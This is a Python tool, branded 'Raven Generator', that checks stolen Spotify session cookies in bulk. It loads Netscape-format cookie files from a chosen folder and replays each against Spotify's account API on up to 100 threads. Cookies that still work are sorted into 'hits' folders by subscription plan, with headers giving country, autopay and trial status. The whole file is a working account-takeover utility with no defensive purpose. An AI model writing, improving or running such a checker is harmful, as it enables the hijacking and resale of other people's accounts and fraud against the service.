import requests
import os
import colorama
import tkinter as tk
from tkinter import filedialog
import threading

colorama.init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium + Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")

def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"

    header = f"PLAN = {plan}\nCOUNTRY = {country}\nAutoPay = {auto_pay}\nTrial = {trial}\nChecked By Raven Generator\nSpotify COOKIE :👇\n\n\n"
    return header + cookie_content

def ask_for_cookie_folder():
    root = tk.Tk()
    root.withdraw()

    # Ask user to select the cookie folder
    cookie_folder = filedialog.askdirectory(title="Select the folder containing Spotify cookies")
    
    if not cookie_folder:
        print("No folder selected. Please try again.")
        return ask_for_cookie_folder()
    
    return cookie_folder

def checkNetscapeCookies(cookie_folder, num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}

    def checkCookie(cookie):
        try:
            cookie_path = os.path.join(cookie_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                read_cookie = f.read()

                cookies = {}
                for line in read_cookie.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

                if response.status_code == 200:
                    data = response.json()
                    current_plan = data.get("currentPlan", "unknown")

                    counts['hits'] += 1
                    print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)

                    # Creating a folder structure in the "hits" folder based on the plan name
                    output_folder = plan_name_mapping(current_plan).replace(" ", "_").lower()
                    hits_folder = os.path.join(os.getcwd(), "hits", output_folder)
                    os.makedirs(hits_folder, exist_ok=True)

                    # Saving the cookie to the corresponding folder with UTF-8 encoding
                    formatted_cookie = format_cookie_file(data, read_cookie)
                    with open(os.path.join(hits_folder, f"{cookie}.txt"), 'w', encoding='utf-8') as out_f:
                        out_f.write(formatted_cookie)

                else:
                    counts['bad'] += 1
                    print(colorama.Fore.RED + f"Login failed with {cookie}" + colorama.Fore.RESET)
        except Exception as e:
            counts['errors'] += 1
            print(colorama.Fore.RED + f"Error: {e} with {cookie}" + colorama.Fore.RESET)

    cookies = os.listdir(cookie_folder)

    def worker():
        while True:
            try:
                cookie = cookies.pop(0)
            except IndexError:
                break

            checkCookie(cookie)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

def main():
    clear_screen()

    print(""" 
██████╗░░█████╗░██╗░░░██╗███████╗███╗░░██╗  ██╗░░██╗  ███████╗██████╗░██████╗░░█████╗░██╗░░██╗
██╔══██╗██╔══██╗██║░░░██║██╔════╝████╗░██║  ╚██╗██╔╝  ██╔════╝██╔══██╗╚════██╗██╔══██╗██║░██╔╝
██████╔╝███████║╚██╗░██╔╝█████╗░░██╔██╗██║  ░╚███╔╝░  █████╗░░██████╔╝░█████╔╝███████║█████═╝░
██╔══██╗██╔══██║░╚████╔╝░██╔══╝░░██║╚████║  ░██╔██╗░  ██╔══╝░░██╔══██╗░╚═══██╗██╔══██║██╔═██╗░
██║░░██║██║░░██║░░╚██╔╝░░███████╗██║░╚███║  ██╔╝╚██╗  ██║░░░░░██║░░██║██████╔╝██║░░██║██║░╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝  ╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝
    """)

    # Ask for folder and threads
    cookie_folder = ask_for_cookie_folder()

    try:
        num_threads = int(input("Enter number of threads (1-100): "))
        if num_threads < 1 or num_threads > 100:
            raise ValueError
    except ValueError:
        print("Invalid input")
        clear_screen()
        main()
    
    # Start checking the cookies
    checkNetscapeCookies(cookie_folder, num_threads)

if __name__ == "__main__":
    main()
